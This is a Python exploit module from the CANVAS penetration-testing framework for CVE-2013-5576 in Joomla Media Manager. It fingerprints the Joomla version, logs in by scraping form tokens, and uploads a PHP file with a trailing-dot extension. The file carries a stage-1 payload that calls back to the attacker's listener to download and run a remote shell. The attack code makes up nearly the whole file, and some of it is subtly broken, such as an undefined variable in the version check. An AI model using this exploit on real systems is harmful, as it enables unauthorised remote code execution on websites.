#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
import time
import socket
import base64
import urllib2
import random
import StringIO

#covers both angles
if "." not in sys.path: sys.path.append(".")

import libs.spkproxy as spkproxy

from exploitutils import *
from ExploitTypes.php_multi import *

NAME                           = "joomla_mm_rce"
DESCRIPTION                    = "Joomla Media Manager <= 3.1.4 arbitrary file upload"
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = "Joomla"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["CVE Name"]      = "CVE-2013-5576"
DOCUMENTATION["CVE URL"]       = "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5576"
VERSION                        = "1.0"
PROPERTY                       = {}
PROPERTY['TYPE']               = "Web Exploits"
PROPERTY['SITE']               = "Remote"
PROPERTY['ARCH']               = [["Linux" ], ["Windows"]]

DOCUMENTATION['Notes']         = """

This module was tested in a Joomla 3.1.4 on Windows 7.

Depending on the configuration of the site this module may require valid
credentials in order to exploit the file upload vulnerability.
"""

CHANGELOG                      = """
"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.host               = ""
        self.port               = 80

        self.badstring          = "\x00"
        self.name               = NAME
        self.vhost              = ""

        self.basepath           = "/"
        self.username           = None
        self.password           = None
        self.ssl                = False
        self.protocol           = None
        self.only_test          = False
        self.filename           = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))


    def neededListenerTypes(self):
        return [canvasengine.PHPMULTI]

    def getargs(self):
        """
        Get arguments for attack.
        """
        self.getarg("port")
        self.getarg("basepath")
        self.getarg("username")
        self.getarg("password")
        self.getarg("vhost")
        self.getarg("ssl")
        self.getarg("only_test")

    def get_php_to_mosdef(self):
        """
        Creates a string which when included in php's eval() will download and execute
        MOSDEF
        """

        localhost = self.callback.ip
        localport = self.callback.port

        self.log("[+] Using PHPMULTI callback for %s:%d" % (localhost, localport))
        from phplistener import get_php_stage1 #get our "Shellcode"

        badchars = self.badstring
        ret = get_php_stage1(badchars,localhost,localport)
        self.log("[ii] Generated callback shell")
        return ret

    def test(self):
        self.getargs()

        if self.vhost:
            self.host = self.vhost
        else:
            self.host = self.target.interface

        if self.ssl:
            self.protocol = "https"
        else:
            self.protocol = "http"

        exheaders = [("Keep-Alive", "115")]

        request = "language/en-GB/en-GB.xml"
        u = self.protocol + "://" + self.host + ":" + str(self.port) + self.basepath + request

        try:
            (res, responsecode) = spkproxy.urlopen(u, extraheaders=exheaders, exploit=self, entireresponse=True, return_response_code=True, verb="GET")
            response = res.read()
            if responsecode == 200 and "version" in response:
                begin = a.find("version>")
                end = a.find("</version", begin)
                version = a[begin+len("version>"):end]

                # For Joomla 3.1.5 this file have 3.1.4 in the <version> section.
                if version < "3.1.4":
                    return 1
        except Exception:
            self.log("[EE] The file may be unavailable but the server might be vulnerable")
            return 1

        return 0

    def login(self, cookie):
        self.log("[+] Logging in")
        # We have to obtain a token in order to log in, so i have to parse the response with the form-login-submit

        exheaders = [("Cookie", cookie),("Keep-Alive", "115")]
        request = "index.php"
        u = self.protocol + "://" + self.host + ":" + str(self.port) + self.basepath + request

        try:
            (res, responsecode) = spkproxy.urlopen(u, extraheaders=exheaders, exploit=self, entireresponse=True, return_response_code=True, verb="GET")
            response = res.read()
            if responsecode == 200:
                start = response.find("id=\"form-login-submit\"")
                return_value_start = response.find("name=\"return\" value=\"", start)
                end = response.find("\"", return_value_start+len("name=\"return\" value=\""))
                return_value = response[return_value_start+len("name=\"return\" value=\""):end]

                token_start = response.find("type=\"hidden\" name=\"", end)
                token_end = response.find("\" value=", token_start)
                token = response[token_start+len("type=\"hidden\" name=\""):token_end]
        except Exception:
            return 1

        exheaders = [("Content-Type", "application/x-www-form-urlencoded"),("Cookie", cookie),("Keep-Alive", "115")]
        request = "/index.php/component/users/?task=user.login"
        u = self.protocol + "://" + self.host + ":" + str(self.port) + self.basepath + request
        POSTDATA = "username=%s&password=%s&%s=1" % (self.username,self.password,token)

        try:
            (res, responsecode) = spkproxy.urlopen(u, extraheaders=exheaders, data=POSTDATA, exploit=self, entireresponse=True, return_response_code=True, verb="POST")
            response = res.read()
            return 0
        except Exception:
            return 1

        self.log("[EE] Invalid credentials")
        return 1

    def run(self):
        self.getargs()

        if self.vhost:
            self.host = self.vhost
        else:
            self.host = self.target.interface

        self.setInfo("%s attacking %s (in progress)" % (NAME, self.host))
        self.log("[ii] %s attacking %s (in progress)" % (NAME, self.host))

        self.log('[ii] Port: %s' % self.port)
        self.log('[ii] SSL: %s' % self.ssl)
        self.log('[ii] Basepath: %s' % self.basepath)
        self.log('[ii] Username: %s' % self.username)
        self.log('[ii] Password: %s' % self.password)

        if self.ssl:
            self.protocol = "https"
        else:
            self.protocol = "http"

        if self.only_test:
            if self.test() == 1:
                self.log("[ii] Target host appears vulnerable")
                return 1
            else:
                self.log("[EE] Target host does not appear to be bulnerable")
                return 0

        self.log("[ii] Trying to attack without credentials")

        exheaders = [("Keep-Alive", "115")]
        request = "index.php/component/media/?view=images&e_name=jform_articletext&asset=com_content&author="
        u = self.protocol + "://" + self.host + ":" + str(self.port) + self.basepath + request

        try:
            (res, responsecode) = spkproxy.urlopen(u, extraheaders=exheaders, exploit=self, entireresponse=True, return_response_code=True, verb="GET")
            response = res.read()
            if "You are not authorised to view this resource" in response:
                self.log("[ii] Valid credentials required")
                if not self.username:
                    return 0
                cookie_start = response.find("Set-Cookie: ")
                end = response.find("; path=/;", cookie_start)
                cookie = response[cookie_start+len("Set-Cookie: "):end]
                self.login(cookie)
        except Exception:
            return 1

        self.log("[+] Getting upload form")
        exheaders = [("Cookie", cookie),("Keep-Alive", "115")]
        request = "index.php/component/media/?view=images&e_name=jform_articletext&asset=com_content&author="
        u = self.protocol + "://" + self.host + ":" + str(self.port) + self.basepath + request

        try:
            (res, responsecode) = spkproxy.urlopen(u, extraheaders=exheaders, exploit=self, entireresponse=True, return_response_code=True, verb="GET")
            response = res.read()
            if "id=\"uploadForm\"" in response:
                self.log("[ii] Logged. Attack in progress")
            else:
                return 0
        except Exception:
            return 1

        UF_pos = response.find("id=\"uploadForm\"")
        form_pos = response.rfind("form action=", 0, UF_pos)
        options = response[form_pos:UF_pos].split("&")
        options = [x for x in options if not any(i in x for i in ["option=com_media","task=file.upload","tmpl=component","asset=com_content","author=","view=images"])]
        if len(options) == 2:
            cookie_value = options[0][4:]
            token = options[1][4:]

        self.log("[+] Uploading")
        bound = "_Part_%s_%s_%s" % (str(random.randint(0,0x400)), str(random.randint(0,0xffffffff)), str(random.randint(0,0xffffffff)))
        exheaders = [("Content-Type", "multipart/form-data; boundary=" + bound),("Cookie", cookie),("Keep-Alive", "115")]
        request = "index.php?option=com_media&task=file.upload&tmpl=component&%s&%s&asset=com_content&author=&view=images?asset=com_content&author=&format=&view=images&folder=" % (cookie_value, token)
        u = self.protocol + "://" + self.host + ":" + str(self.port) + self.basepath + request
        POSTDATA = "--%s\r\n" % bound
        POSTDATA += "Content-Disposition: form-data; name=\"Filedata[]\"; filename=\"%s.php.\"\r\n" % self.filename
        POSTDATA += "Content-Type: application/x-php\r\n"

        POSTDATA += "\r\n#<?php\r\n"
        POSTDATA += self.get_php_to_mosdef()
        POSTDATA += "\r\n\r\n--%s--\r\n\r\n" % bound
        try:
            (res, responsecode) = spkproxy.urlopen(u, extraheaders=exheaders, data=POSTDATA, exploit=self, entireresponse=True, return_response_code=True, verb="POST")
            response = res.read()
        except Exception:
            return 1

        self.log("[+] Getting shellcode")
        exheaders = [("Cookie", cookie),("Keep-Alive", "115")]
        request = "images/%s.php" % self.filename
        u = self.protocol + "://" + self.host + ":" + str(self.port) + self.basepath + request

        try:
            (res, responsecode) = spkproxy.urlopen(u, extraheaders=exheaders, exploit=self, entireresponse=True, return_response_code=True, verb="GET")
            response = res.read()
        except Exception:
            return 1

        return 1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)

